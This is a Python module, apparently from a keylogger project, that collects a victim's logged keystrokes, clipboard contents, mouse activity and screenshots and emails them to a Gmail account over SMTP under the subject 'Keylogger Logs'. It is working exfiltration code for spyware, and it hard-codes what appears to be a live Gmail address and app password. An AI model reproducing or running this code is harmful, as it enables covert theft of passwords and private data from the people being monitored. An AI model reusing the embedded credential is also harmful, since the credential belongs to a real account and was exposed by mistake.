# modules/email_sender.py
import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# ✅ Fill in your actual email credentials
EMAIL_ADDRESS = "beheraprabin181@gmail.com"
EMAIL_PASSWORD = "yzsz rxgt bexu qugx"
RECEIVER_EMAIL = "beheraprabin181@gmail.com"

def send_logs_via_email(user_folder):
    try:
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = RECEIVER_EMAIL
        msg["Subject"] = "🔒 Keylogger Logs"

        msg.attach(MIMEText(f"Logs for user: {os.path.basename(user_folder)}", "plain"))

        # Collect log files
        log_files = [
            os.path.join(user_folder, "keystrokes.txt"),
            os.path.join(user_folder, "clipboard.txt"),
            os.path.join(user_folder, "mouse_log.txt"),
        ]

        # Attach all screenshots
        screenshot_dir = os.path.join(user_folder, "screenshots")
        if os.path.exists(screenshot_dir):
            for file in sorted(os.listdir(screenshot_dir)):
                file_path = os.path.join(screenshot_dir, file)
                if file_path.endswith(".png"):
                    log_files.append(file_path)

        # Attach files
        for file_path in log_files:
            if os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    part = MIMEApplication(f.read(), Name=os.path.basename(file_path))
                    part["Content-Disposition"] = f'attachment; filename="{os.path.basename(file_path)}"'
                    msg.attach(part)

        # Send email
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)

        print("✅ Email sent successfully.")

    except Exception as e:
        print(f"❌ Failed to send email: {e}")
